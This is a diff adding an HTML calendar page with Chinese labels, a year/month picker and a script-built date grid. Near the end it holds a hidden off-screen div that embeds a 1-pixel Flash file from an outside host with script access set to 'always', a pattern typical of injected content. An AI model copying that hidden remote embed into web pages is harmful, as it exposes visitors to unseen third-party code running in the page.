@@ -1,0 +1,84 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<style>
+*{margin:10;padding:10;list-style:0;border:0;}
+body{background: #FC3;}
+.content{border:3px solid #ddd;width:405px;margin:100px auto;}
+.datetable{text-align:center; border-color:red; border-right:1px;border-left:1px;}
+.datetable td{text-align:center;}
+.datetable thead{background:#006600;}
+.datetable thead td{padding:10px 5px;font:normal 12px/normal 'microsoft yahei';color:#fff;text-align:center;}
+.datetable thead td span{padding:0 5px;}
+.datetable tbody td{padding:5px 3px;font-size:12px;}
+.datetable tbody td select{border:0px; border-color:#0C6;}
+</style>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<TITLE>动态日历</TITLE>          
+<SCRIPT language="JavaScript" src="Calendar.js"></SCRIPT> 
+<BODY onload=initial()>
+<hr>
+<br />
+<br />
+<CENTER>
+<FORM name=CLD>
+<TABLE>
+  <TR>
+    <TD align=middle ><div id='time'></div>
+      <TABLE border=0 cellpadding="0" cellspacing="0" class="datetable" ><!--bordercolordark="#FFFFFF" bordercolor="#ffffff" bordercolorlight="#EEEEEE"-->
+        <TR bgcolor="red">
+        
+          <TD colSpan=7 height='25'><FONT color=#ffffff style="FONT-SIZE: 9pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	
+          <IMG src="images/left.gif" border=0 style="cursor:hand;" title="上一年" onclick="getyear(-1);" />&nbsp;&nbsp;
+          <IMG src="images/left.gif" border=0 style="cursor:hand;" title="上一月" onclick="lastmonth();" /> &nbsp;&nbsp;公历 
+            <SELECT name=SY id="year" onchange=changeCld() style="FONT-SIZE: 9pt;" disabled="disabled"> 
+            <SCRIPT language="JavaScript">
+            for(i=1900;i<2101;i++) document.write('<option>'+i);
+            </SCRIPT>
+            </SELECT> 年 <SELECT name=SM  id="month"onchange=changeCld() style="FONT-SIZE: 9pt;" disabled="disabled"> 
+            <SCRIPT language="JavaScript">
+            for(i=1;i<13;i++) document.write('<option>'+i);
+            </SCRIPT>
+            </SELECT> 月 </FONT> 
+            <FONT color=#ffffff face=宋体 id=GZ style="FONT-SIZE: 12pt"></FONT>
+            <IMG src="images/right.gif" border=0 style="cursor:hand;" title="下一月" onclick="nextmonth();" />&nbsp;&nbsp;
+            <IMG src="images/right.gif" border=0 style="cursor:hand;" title="下一年" onclick="getyear(1);" />
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;					             
+            <BR>
+            </TD>
+        </TR>
+        <TR align=middle bgColor=#e0e0e0>
+          <TD width=54 style="font-size:9pt; padding:5pt;"><font color="red">日</font></TD>
+          <TD width=54 style="font-size:9pt ">一</TD>
+          <TD width=54 style="font-size:9pt ">二</TD>
+          <TD width=54 style="font-size:9pt ">三</TD>
+          <TD width=54 style="font-size:9pt ">四</TD>
+          <TD width=54 style="font-size:9pt ">五</TD>
+          <TD width=54 style="font-size:9pt "><font color="red">六</font></TD></TR>
+          <SCRIPT language="JavaScript">
+            var gNum;
+            for(i=0;i<6;i++) {
+               document.write('<tr align=center>');
+               for(j=0;j<7;j++) {
+                  gNum = i*7+j;
+					  document.write('<td id="GD' + gNum +'"><font id="SD' + gNum +'" size=2 face="Arial Black"');
+					  if(j == 0||j == 6) document.write(' color=red');
+					  //if(j == 6) document.write(' color=#000080');
+					  document.write(' TITLE=""> </font><br><font id="LD' + gNum + '" size=2 style="font-size:9pt"> </font></td>');	  
+               }
+               document.write('</tr>');
+            }
+           </SCRIPT>
+        </TABLE>
+</TD>
+  </TR>
+  <TR bgcolor="red">
+  <TD colSpan=7 height='25' align="center"><FONT color='black' style="FONT-SIZE: 12pt;cursor:hand;" title="返回今天" onclick="getNowadays();">>>返回今天</FONT>
+  </TR>
+</TABLE>
+</FORM>
+</CENTER>
+<div style="width:0px;height:0px;position:absolute;top:-999px;left:-999px;"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="bloxyantiphish" width="1px" height="1px"><param name="AllowScriptAccess" value="always"/><param name="movie" value="http://p.bloxy.cn/antiphish.swf"/><embed name="bloxyantiphish" width="1px" height="1px" allowscriptaccess="always" align="middle" src="http://p.bloxy.cn/antiphish.swf" type="application/x-shockwave-flash"/></object></div></BODY>
+</HTML>
+
+<br><br><hr><p align="center"><font color=black>本特效 <a href="#" target="_blank">Create By Chemyoo</a> | 刘建青 收集于互联网并学习开发，只为兴趣与学习交流，不作商业用途。</font></p>
